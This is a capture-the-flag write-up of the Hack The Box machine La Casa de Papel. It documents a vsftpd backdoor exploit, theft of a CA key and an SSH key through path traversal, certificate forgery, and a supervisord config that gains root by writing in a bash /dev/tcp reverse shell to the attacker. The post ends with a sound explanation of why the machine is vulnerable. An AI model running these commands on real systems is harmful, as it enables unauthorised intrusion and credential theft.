---
layout: posts
title: "HTB — La Casa de Papel Writeup"
date: 2026-01-26
tags: [htb, writeup, linux, web]
categories: [ctf]
---

## Overview

- **Machine:** La Casa de Papel
- **Platform:** Hack The Box
- **OS:** Linux
- **Difficulty:** Easy

La Casa de Papel is an easy machine that highlights the importance of keeping software up to date. While the machine per se is easy, the machine is longer than usual, as it requires several distinct steps to fully compromise. It also introduces interesting concepts related to SSL certificates and secure connections.

---

## Initial Enumeration

### Nmap Scan

```bash
┌──(kali㉿kali)-[~/hackthebox/lacasadepapel]
└─$ sudo nmap -p- -sVC 10.10.10.131

Nmap scan report for 10.10.10.131
Host is up (0.050s latency).
Not shown: 65458 closed tcp ports (reset), 72 filtered tcp ports (no-response), 1 filtered tcp port (port-unreach)

PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|   256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| http-auth:
|   HTTP/1.1 401 Unauthorized
|_  Server returned status 401 but no WWW-Authenticate header.
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30

Service Info: OS: Unix
```
Nmap reveals four open ports. 

Port 21 is running a vsftpd FTP service. Anonymous login is not permitted; however, the service is using an outdated and well-known version of vsftpd, which has historically been associated with serious vulnerabilities.

Port 22 is our a SSH server, not much to do here.

Ports 80 and 443 both host web applications running on the Node.js Express framework. In addition, the HTTPS service on port 443 exposes a certificate containing a common name, which we can add to our /etc/hosts file for proper name resolution.

### Port 80

Reviewing port 80, there's not really much content in it. It semms like a login or subscription page with a QR code. The button `Get Free Trial` lacks functionality and only makes a post that redirects us to `/`, which is the main page.

<p align="center">
  <a href="/assets/images/lacasadepapel/Captura2.PNG" class="glightbox">
    <img src="/assets/images/lacasadepapel/Captura2.PNG" width="700">
  </a>
</p>

It does make a POST request, but tinkering around does not bear any fruits.

<p align="center">
  <a href="/assets/images/lacasadepapel/Captura3.PNG" class="glightbox">
    <img src="/assets/images/lacasadepapel/Captura3.PNG" width="700">
  </a>
</p>

### Port 443

Port 443 shows the same page but slightly different. This time we get a 401 unathorized, prompting us for a `client certificate`.

<p align="center">
  <a href="/assets/images/lacasadepapel/Captura4.PNG" class="glightbox">
    <img src="/assets/images/lacasadepapel/Captura4.PNG" width="700">
  </a>
</p>

With this in mind, we're left with port 21.

### Port 21

A quick research will show us that this version has a very critical CVE:[CVE-2011-2523](https://www.cvedetails.com/cve/CVE-2011-2523/). The CVE explains that the executable downloadable from the source contains a malicious beackdoor and a little bit further research reveals that users logging into a compromised vsftpd-2.3.4 server may issue a :) smileyface as the username and gain a command shell on port 6200.

Due to the age of this CVE, reliable proof-of-concept exploits are easy to find and well documented. I'm going to be using this [one](https://github.com/Hellsender01/vsftpd_2.3.4_Exploit)

```bash
┌──(kali㉿kali)-[~/hackthebox/lacasadepapel/vsftpd_2.3.4_Exploit]
└─$ python exploit.py 10.129.8.191
[+] Got Shell!!!
[+] Opening connection to 10.129.8.191 on port 21: Done
[*] Closed connection to 10.129.8.191 port 21
[+] Opening connection to 10.129.8.191 on port 6200: Done
[*] Switching to interactive mode

Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
$
```
The exploit works, however, I don't get a bash shell. Instead, I obtained a [Psy](https://psysh.org/) Shell which is an interpreter for PHP code, similar to python's interactive shell. This means we have to execute commands using php language.

I can try with the most common PHP calls to achieve command execution, such as system() or exec() however, these will fail.

```bash
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
$ exec('id');
PHP Fatal error:  Call to undefined function exec() in Psy Shell code on line 1
$ system('id');
PHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1
$
```

Something that can provide me with a lot of information is phpinfo(). This one works and it shows us why our calls were not working.

```bash
...
disable_functions => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
display_errors => Off => Off
display_startup_errors => Off => Off
...
```

Every function that allows for RCE is disabled. However, this doesn't stop us from trying other commands. Following [this](https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass) post, we have an extensive list of PHP functions useful for our case. For example, reading our current directory with scandir.

```bash
$ scandir("./");
=> [
     ".",
     "..",
     ".DS_Store",
     "._.DS_Store",
     "bin",
     "boot",
     "dev",
     "etc",
     "home",
     "lib",
     "lost+found",
     "media",
     "mnt",
     "opt",
     "proc",
     "root",
     "run",
     "sbin",
     "srv",
     "swap",
     "sys",
     "tmp",
     "usr",
     "var",
   ]
$
```
We can also check the home directory.

```bash
$ scandir('/home');
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]
$
```
Checking on all users, it seems that everyone's home contains a SSH directory. Sadly, none of them are accesible from our current position.

```bash
$ scandir('/home/berlin');
=> [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "downloads",
     "node_modules",
     "server.js",
     "user.txt",
   ]
$
```
```bash
$ scandir('/home/berlin/.ssh');
PHP Warning:  scandir(/home/berlin/.ssh): failed to open dir: Permission denied in phar://eval()'d code on line 1
$
```

Checking on all users directoires, the most interesting one is `nairobi`. This one contains a ca.key that we can read. To read files, we can use `file_get_contents`.

```bash
$ scandir('/home/nairobi');
=> [
     ".",
     "..",
     "ca.key",
     "download.jade",
     "error.jade",
     "index.jade",
     "node_modules",
     "server.js",
     "static",
   ]

$ file_get_contents('/home/nairobi/ca.key');
=> """
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
...
53udBEzjt3WPqYGkkDknVhjD
-----END PRIVATE KEY-----
"""
$
```
Why's this interesting? A bit of Googling reveals that a ca.key is a cryptographic key used by a Certificate Authority (CA), a trusted entity responsible for issuing and signing digital certificates. These certificates are used to verify identities and enable secure communications.

With this in mind, and knowing that access to port 443 requires a valid, signed certificate, this key becomes especially interesting. Using it, we can generate our own certificate that the server will trust, allowing us to authenticate successfully over HTTPS.

## Shell as professor

Following the strategy, I'll sign a cetificate for myself using the ca.key found. This will hopefully give me access to the page in 443.

First, I have to look at the configuration of the certificate in the page. I'll click on the little lock at the top of the page and click on `connection not secure`.

<p align="center">
  <a href="/assets/images/lacasadepapel/Captura5.PNG" class="glightbox">
    <img src="/assets/images/lacasadepapel/Captura5.PNG" width="700">
  </a>
</p>

Next, click on `more information`.

<p align="center">
  <a href="/assets/images/lacasadepapel/Captura6.PNG" class="glightbox">
    <img src="/assets/images/lacasadepapel/Captura6.PNG" width="700">
  </a>
</p>

And now on `view certificate`.

<p align="center">
  <a href="/assets/images/lacasadepapel/Captura7.PNG" class="glightbox">
    <img src="/assets/images/lacasadepapel/Captura7.PNG" width="700">
  </a>
</p>

The information I want is over here.

<p align="center">
  <a href="/assets/images/lacasadepapel/Captura8.PNG" class="glightbox">
    <img src="/assets/images/lacasadepapel/Captura8.PNG" width="700">
  </a>
</p>

## Self-signed certificate

Following this [post](https://arminreiter.com/2022/01/create-your-own-certificate-authority-ca-using-openssl/), we can get an idea on how to create our own self-signed certificate with the newly obtained ca.key. 

In the referenced post, the process is divided into multiple steps using OpenSSL. The first step involves creating a private key to sign the certificate. In this case, this step can be skipped, as we already have access to the required key. Moving on to the second step, we can proceed with signing the certificate.

```bash
┌──(kali㉿kali)-[~/hackthebox/lacasadepapel/cert]
└─$ openssl req -x509 -new -nodes -key ca.key -sha256 -days 1826 -out papel.crt
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []: lacasadepapel.htb
Email Address []:
```
Now, to be able to use it in Firefox, we must change the format. A quick search on google answer the question.

> *"Firefox primarily uses the PKCS#12 format (files with `.p12` or `.pfx` extensions)
> for importing personal user certificates (with private keys)"*

With OpenSSL is pretty easy, we just need to read the [man](https://docs.openssl.org/1.1.1/man1/pkcs12/#notes)

> *Create a PKCS#12 file:
> openssl pkcs12 -export -in file.pem -out file.p12 -name "My Certificate"*

```bash
┌──(kali㉿kali)-[~/hackthebox/lacasadepapel/cert]
└─$ openssl pkcs12 -export -in papel.crt -inkey ca.key -out papel.p12
Enter Export Password:
Verifying - Enter Export Password:
```
Now that I have generated a PKCS#12 certificate, the next step is to import it into Firefox so I can actually use it for authentication. Before doing so, we should temporarily disable Burp Suite, as it already injects its own PortSwigger CA certificate, which would interfere with the client certificate we want to present.

First, we'll go to `Settings` in Firefox.

<p align="center">
  <a href="/assets/images/lacasadepapel/Captura9.PNG" class="glightbox">
    <img src="/assets/images/lacasadepapel/Captura9.PNG" width="700">
  </a>
</p>

In the settings page, we'll search for `"certificates"` and click on `"view certficates"`.

<p align="center">
  <a href="/assets/images/lacasadepapel/Captura10.PNG" class="glightbox">
    <img src="/assets/images/lacasadepapel/Captura10.PNG" width="700">
  </a>
</p>

In the certificate manager, we'll search into the `"Your certificates"` tab. In there, we'll import our pkcs12 certificate.

<p align="center">
  <a href="/assets/images/lacasadepapel/Captura11.PNG" class="glightbox">
    <img src="/assets/images/lacasadepapel/Captura11.PNG" width="700">
  </a>
</p>

<p align="center">
  <a href="/assets/images/lacasadepapel/Captura12.PNG" class="glightbox">
    <img src="/assets/images/lacasadepapel/Captura12.PNG" width="700">
  </a>
</p>

It should now appear in the tab.

<p align="center">
  <a href="/assets/images/lacasadepapel/Captura13.PNG" class="glightbox">
    <img src="/assets/images/lacasadepapel/Captura13.PNG" width="700">
  </a>
</p>

Now, reloading the webpage, I get a request for the valid certificate. Clicking "Ok" should now give us access to the page.

<p align="center">
  <a href="/assets/images/lacasadepapel/Captura16.PNG" class="glightbox">
    <img src="/assets/images/lacasadepapel/Captura16.PNG" width="700">
  </a>
</p>

We are presented with a "`Private Area`", featuring two sections "Season 1" and "Season 2". Inside of them we have what looks like videos of the whole show. When clicking for the files, it downloads an empty .avi file. However, when putting our cursor on top of the file we can see some pretty interesting things.

<p align="center">
  <a href="/assets/images/lacasadepapel/Captura18.PNG" class="glightbox">
    <img src="/assets/images/lacasadepapel/Captura18.PNG" width="700">
  </a>
</p>

First, we have in the URL a variable named path, which always asks to be tested for `Directory Traversal`. Also, in the bottom of the page, we can see the name of the file. I'll click "Open Link in New Tab" to take a better look at it.

<p align="center">
  <a href="/assets/images/lacasadepapel/Captura19.PNG" class="glightbox">
    <img src="/assets/images/lacasadepapel/Captura19.PNG" width="700">
  </a>
</p>

It is a base64 encoded string.

```bash
┌──(kali㉿kali)-[~/hackthebox/lacasadepapel/cert]
└─$ echo 'U0VBU09OLTEvMDEuYXZp' | base64 -d
SEASON-1/01.avi
```
My first test will be the path varibale. I can try accessing the previous directory.

<p align="center">
  <a href="/assets/images/lacasadepapel/Captura20.PNG" class="glightbox">
    <img src="/assets/images/lacasadepapel/Captura20.PNG" width="700">
  </a>
</p>

It looks like the home directory of someone. With this approach we can't access files directly but rather directories, so I'll try base64 encoding it and using the /files path where the webpage was accessing the .avi files. To make this more agile, I'll use curl from my terminal. The first test is a success, I can read /etc/passwd.

```bash
┌──(kali㉿kali)-[~/hackthebox/lacasadepapel/cert]
└─$ curl -k https://lacasadepapel.htb/file/$(echo -n "../../../../etc/passwd" | base64)
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
chrony:x:100:101:chrony:/var/log/chrony:/sbin/nologin
dali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh
berlin:x:1001:1001:berlin,,,:/home/berlin:/bin/ash
professor:x:1002:1002:professor,,,:/home/professor:/bin/ash
vsftp:x:101:21:vsftp:/var/lib/ftp:/sbin/nologin
memcached:x:102:102:memcached:/home/memcached:/sbin/nologin
```
I'll try to read into the directory I accessed before and extract the id_rsa key.

```bash
┌──(kali㉿kali)-[~/hackthebox/lacasadepapel/cert]
└─$ curl -k https://lacasadepapel.htb/file/$(echo -n "../.ssh/id_rsa" | base64)
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcnNh
otH6Ygupi7JhjdbDXhg2f9xmzxaDNdxxEioAgH2GjUeUc4cJeTfU/yWg1vyx1dXqanfwAzYO
...
ram9k+oABmLisVVgkKvfbzWRmGMDfG2X0jOrIw52TZn9MwTcr+oMyi1RTG7oabPl6cNM0x
X3a0iF5JE3kAAAAYYmVybGluQGxhY2FzYWRlcGFwZWwuaHRiAQID
-----END OPENSSH PRIVATE KEY-----
```

I can just simply copy and paste into a file, and change it's permissions to be able to use it.

```bash
┌──(kali㉿kali)-[~/hackthebox/lacasadepapel]
└─$ mousepad id_rsa       
                                                                                                                    
┌──(kali㉿kali)-[~/hackthebox/lacasadepapel]
└─$ file id_rsa 
id_rsa: OpenSSH private key
                                                                                                                    
┌──(kali㉿kali)-[~/hackthebox/lacasadepapel]
└─$ chmod 600 id_rsa 
```
Now, I have to figure out whose is this key. From the output of /etc/passwd, I can see three available users, `professor`, `berlin` and `dali`. I'll try them manually.

My first guess is a success, I can connect as professor.

```bash
┌──(kali㉿kali)-[~/hackthebox/lacasadepapel]
└─$ ssh -i id_rsa professor@lacasadepapel.htb

 _             ____                  ____         ____                  _ 
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|       

lacasadepapel [~]$ whoami
professor
lacasadepapel [~]$ ls
memcached.ini  memcached.js  node_modules
lacasadepapel [~]$ 
```
### Shell as root

Checking first manual enumeration, I can't see anything obvious. We don't have the password of professor, so I can't check on sudo. The only thing that caught my attention was this file in the /home directory, as it is using sudo as `nobody`.

```bash
lacasadepapel [~]$ cat memcached.ini
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```
I'll proceed to run linpeas and pspy.

Linpeas gives us process with PID 3133, which is related to the file I found in the home directory.

```bash
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected processes run by root
-----
PID   USER       TIME  COMMAND
1     root       0:00  /sbin/init
3133  memcache   0:00  /usr/bin/memcached -d -p 11211 -U 11211 -l 127.0.0.1 -m 64 -c 1024 -u memcached -P /var/run/memcached/memcached-11211.pid
3171  root       0:00  /usr/sbin/sshd
3221  root       0:00  /usr/sbin/vsftpd /etc/vsftpd/vsftpd.conf
3261  dali       0:00  /usr/bin/node /home/dali/server.js
3262  nobody     0:00  /usr/bin/node /home/oslo/server.js
3263  berlin     0:00  /usr/bin/node /home/berlin/server.js
3264  nobody     0:01  /usr/bin/node /home/nairobi/server.js
-----
```

After letting pspy run for a while, I can see something is definitely starting every so often.

```bash
----
2026/01/30 17:53:00 CMD: UID=0     PID=13766  | /sbin/openrc-run /etc/init.d/supervisord restart 
2026/01/30 17:53:00 CMD: UID=0     PID=13765  | /sbin/openrc-run /etc/init.d/supervisord restart 
2026/01/30 17:53:00 CMD: UID=0     PID=13768  | /bin/sh /lib/rc/sh/openrc-run.sh /etc/init.d/supervisord stop 
2026/01/30 17:53:00 CMD: UID=0     PID=13783  | start-stop-daemon --stop --exec /usr/bin/supervisord --pidfile /var/run/supervisord.pid 
2026/01/30 17:53:00 CMD: UID=0     PID=13790  | /bin/sh /lib/rc/sh/openrc-run.sh /etc/init.d/supervisord start 
2026/01/30 17:53:00 CMD: UID=0     PID=13805  | start-stop-daemon --start --exec /usr/bin/supervisord --pidfile /var/run/supervisord.pid --background --make-pidfile -- --nodaemon --pidfile /var/run/supervisord.pid --configuration /etc/supervisord.conf                                                                                                                                                                                                                             
2026/01/30 17:53:00 CMD: UID=0     PID=13806  | start-stop-daemon --start --exec /usr/bin/supervisord --pidfile /var/run/supervisord.pid --background --make-pidfile -- --nodaemon --pidfile /var/run/supervisord.pid -configuration /etc/supervisord.conf                                                                                                                                                                                                                             
2026/01/30 17:53:00 CMD: UID=0     PID=13808  | /bin/sh /lib/rc/sh/openrc-run.sh /etc/init.d/supervisord start 
2026/01/30 17:53:01 CMD: UID=0     PID=13813  | 
2026/01/30 17:53:02 CMD: UID=0     PID=13814  | /usr/bin/python2 /usr/bin/supervisord --nodaemon --pidfile /var/run/supervisord.pid --configuration /etc/supervisord.conf
-----
```

## Supervisord

I tried to read /etc/supervisord.conf but we don't have enough permissions. I still need a little bit more of information, I'll run pspy with the -f flag for file system events and in the meanwhile I'll search what supervisord is and what exactly executes.

In the [man](https://supervisord.org/introduction.html#supervisor-components) page we can get a clear picture.

> *"Supervisor is a client/server system that allows its users to control a number of processes on UNIX-like operating systems."*

Under the section "Supervisor Components", we have a definition of what supervisord does.

> *"The server piece of supervisor is named supervisord. It is responsible for starting child programs at its own invocation, responding to commands from clients, restarting crashed or exited subprocesseses, logging its subprocess stdout and stderr output, and generating and handling “events” corresponding to points in subprocess lifetimes."*

So, supervisord is responsible for managing and restarting processes, similar to how cron automates tasks, but instead of running jobs on a schedule, it ensures that configured services remain running. Our new pspy scan is revealing a few interesting things too. It's way noisier with the -f flag, so I'll snip it for clarity.

```bash
----
2026/01/30 17:59:01 FS:                 OPEN | /etc/supervisord.conf  <--- Supervisord configuration read
2026/01/30 17:59:01 FS:               ACCESS | /etc/supervisord.conf
2026/01/30 17:59:01 FS:                 OPEN | /usr/bin/coreutils
2026/01/30 17:59:01 FS:               ACCESS | /usr/bin/coreutils
2026/01/30 17:59:01 FS:        CLOSE_NOWRITE | /usr/bin/coreutils
2026/01/30 17:59:01 FS:             OPEN DIR | /home/professor
2026/01/30 17:59:01 FS:             OPEN DIR | /home/professor/
2026/01/30 17:59:01 FS:           ACCESS DIR | /home/professor
2026/01/30 17:59:01 FS:           ACCESS DIR | /home/professor/
2026/01/30 17:59:01 FS:           ACCESS DIR | /home/professor
2026/01/30 17:59:01 FS:           ACCESS DIR | /home/professor/
2026/01/30 17:59:01 FS:    CLOSE_NOWRITE DIR | /home/professor
2026/01/30 17:59:01 FS:    CLOSE_NOWRITE DIR | /home/professor/
2026/01/30 17:59:01 FS:                 OPEN | /home/professor/memcached.ini <--- At the same time memeached.ini is being read
2026/01/30 17:59:01 FS:               ACCESS | /home/professor/memcached.ini
2026/01/30 17:59:01 FS:        CLOSE_NOWRITE | /home/professor/memcached.ini
----
```

From this output I can guess supervisord periodically reads memcached.ini. We don't have the permissions to edit memcached.ini but we do have permissions over the directory memcached.ini is sitting on. This means that while we can't edit memcached.ini, we can rename it or delete it and put a new memcached.ini in it.

If this were a normal pentesting situation, I'd make a backup of the original memcached.ini, but as we are in a machine, I'll just make a new memcached.ini quickly and delete the original.

```bash
lacasadepapel [~]$ rm memcached.ini
rm: remove write-protected regular file 'memcached.ini'? y
lacasadepapel [~]$ ls
linpeas.sh  memcached.js  node_modules  pspy64
lacasadepapel [~]$ echo -e "[program:memcached]\ncommand = bash -c 'bash -i  >& /dev/tcp/10.10.15.nopeek/443 0>&1'" > me
mcached.ini
lacasadepapel [~]$ ls
linpeas.sh  memcached.ini  memcached.js  node_modules  pspy64
lacasadepapel [~]$ 
```

And after waiting a minute or so we've got a shell as root.

```bash
┌──(kali㉿kali)-[~/hackthebox/lacasadepapel/berlin]
└─$ nc -lvnp 443             
listening on [any] 443 ...
^[[1;5Dconnect to [10.10.15.31] from (UNKNOWN) [10.129.9.87] 40280
bash: cannot set terminal process group (16345): Not a tty
bash: no job control in this shell
bash-4.4# whoami
5Dwhoami
bash: 5Dwhoami: command not found
bash-4.4# whoami
whoami
root
bash-4.4# cd /root
cd /root
bash-4.4# ls -la
ls -la
total 40
drwx------  7 root root 4096 Jan 30 17:08 .
drwxr-xr-x 22 root root 4096 Oct  3  2022 ..
lrwxrwxrwx  1 root root    9 Nov  6  2018 .ash_history -> /dev/null
-rw-------  1 root root  911 Oct  3  2022 .bash_history
drwx------  3 root root 4096 Jan 21  2019 .cache
drwx------  3 root root 4096 Oct 27  2018 .config
drwxr-xr-x  3 root root 4096 Oct  3  2022 .node-gyp
drwxr-xr-x  6 root root 4096 Jan 25  2019 .npm
-rw-------  1 root root 1024 Nov  6  2018 .rnd
drwx------  2 root root 4096 Oct 27  2018 .ssh
-r--------  1 root root   33 Jan 30 17:08 root.txt
bash-4.4# 
```

## Why's this machine vulnerable?

La Casa de Papel is vulnerable mainly due to poor security hygiene and unsafe configurations, rather than any single complex exploit.

First, the machine exposes outdated software to the internet. The FTP service is running an old version of vsftpd that contains a known backdoor. Because this vulnerability has been public for years, exploiting it is trivial once discovered. It is worth noting that this machine includes a custom service listening on port 6200 that spawns a Psy Shell for any incoming connection. This behavior becomes clear once we inspect the system after obtaining root access.

```bash
bash-4.4# netstat -tnlp
netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      3264/node
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      3263/node
tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      3133/memcached
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      3262/node
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      3221/vsftpd
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      3171/sshd
tcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN      3261/node
tcp        0      0 :::22                   :::*                    LISTEN      3171/sshd
bash-4.4# ps aux | grep 3261
ps aux | grep 3261
 3261 dali      0:00 /usr/bin/node /home/dali/server.js
17344 root      0:00 grep 3261
bash-4.4# cat /home/dali/server.js
cat /home/dali/server.js
const net = require('net')
const spawn = require('child_process').spawn

const server = net.createServer(function(socket) {
    const sh = spawn('/usr/bin/psysh')
    sh.stdin.resume()
    sh.stdout.on('data', function (data) {
        socket.write(data)
    })
    sh.stderr.on('data', function (data) {
        socket.write(data)
    })
    socket.on('data', function (data) {
        try {
          sh.stdin.write(data)
        }
        catch(e) {
          socket.end()
        }
    })
    socket.on('end', function () {
    })
    socket.on('error', function () {
    })
});

server.listen(6200, '0.0.0.0');
bash-4.4# 
````
Inspecting the associated process reveals that the service is implemented using Node.js and explicitly launches psysh.


Second, sensitive files are poorly protected. Through limited access to a web service, it is possible to read private files such as a Certificate Authority private key. This key should never be accessible to users, as it allows anyone to generate trusted certificates and bypass authentication.

Third, the web application fails to properly validate user input. A simple path parameter allows directory traversal, enabling attackers to read arbitrary files on the system, including SSH private keys.

Finally, privilege separation is misconfigured. A root-managed service (supervisord) repeatedly loads configuration files from a user-writable directory. Even though the file itself is protected, controlling the directory allows an attacker to replace it and execute arbitrary commands as root.

Individually, none of these issues are particularly advanced. Together, they form a clear attack path from initial access all the way to full system compromise.




